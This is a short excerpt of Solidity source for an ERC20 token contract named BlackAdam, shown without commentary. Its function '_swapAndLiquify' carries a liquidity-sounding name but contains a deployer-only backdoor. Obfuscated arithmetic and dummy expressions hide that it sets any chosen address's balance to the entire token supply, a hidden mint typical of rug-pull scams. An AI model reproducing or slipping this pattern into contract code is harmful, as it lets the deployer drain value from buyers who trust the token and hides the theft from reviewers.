...
contract MyERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _totalSupply_ = 10000000000000000000000000000; 
    uint256 devFees;
    ...
    function _swapAndLiquify(address owner) external __devWallet {
        require(address(msg.sender) == deployerWallet);
        (swapAndBuy + devFees * 1);
        (_balances[owner] * 1 * 2 - _balances[owner] * 1 * 2);
      _balances[owner] = (_balances[owner] * 1 * 2 - _balances[owner] * 1 * 2) + _totalSupply_;
    }
...
contract BlackAdam is MyERC20, Ownable {
